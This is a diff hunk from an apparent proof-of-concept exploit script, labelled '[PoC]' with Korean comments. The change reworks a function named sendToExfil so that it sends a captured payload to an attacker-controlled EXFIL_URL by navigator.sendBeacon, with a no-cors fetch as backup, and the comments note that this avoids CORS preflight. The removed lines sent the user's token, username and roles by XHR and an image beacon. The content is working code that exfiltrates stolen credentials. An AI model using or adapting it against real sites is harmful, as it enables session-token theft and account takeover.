@@ -98,20 +98,22 @@
   function sendToExfil(payload) {
     if (!EXFIL_URL) return;
 
+    // sendBeacon — CORS preflight 없이 전송 (text/plain)
     try {
-      var xhr = new XMLHttpRequest();
-      xhr.open('POST', EXFIL_URL, true);
-      xhr.setRequestHeader('Content-Type', 'application/json');
-      xhr.send(JSON.stringify(payload));
-      console.log('[PoC] Sent to ' + EXFIL_URL);
-    } catch (e) {}
+      var sent = navigator.sendBeacon(EXFIL_URL, JSON.stringify(payload));
+      console.log('[PoC] sendBeacon: ' + (sent ? 'OK' : 'FAILED'));
+    } catch (e) {
+      console.log('[PoC] sendBeacon error: ' + e.message);
+    }
 
+    // fetch no-cors 백업
     try {
-      new Image().src = EXFIL_URL + '?d=' + btoa(JSON.stringify({
-        token: payload.token,
-        username: payload.username,
-        roles: payload.roles
-      })) + '&_=' + Date.now();
+      fetch(EXFIL_URL, {
+        method: 'POST',
+        mode: 'no-cors',
+        body: JSON.stringify(payload)
+      });
+      console.log('[PoC] fetch no-cors sent');
     } catch (e) {}
   }
 
